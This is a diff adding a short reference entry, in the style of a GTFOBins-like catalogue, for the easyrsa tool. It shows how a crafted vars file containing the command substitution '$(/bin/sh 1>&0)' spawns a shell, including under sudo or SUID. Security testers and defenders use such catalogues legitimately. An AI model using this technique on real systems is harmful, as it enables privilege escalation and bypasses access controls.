@@ -1,0 +1,20 @@
+easyrsa
+=======
+
+Shell
+-----
+
+[Sudo]
+    echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+easyrsa --vars=/path/to/temp-file
+    This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
+
+[SUID]
+    echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+easyrsa --vars=/path/to/temp-file
+    This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
+
+[Unprivileged]
+    echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+easyrsa --vars=/path/to/temp-file
+    This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
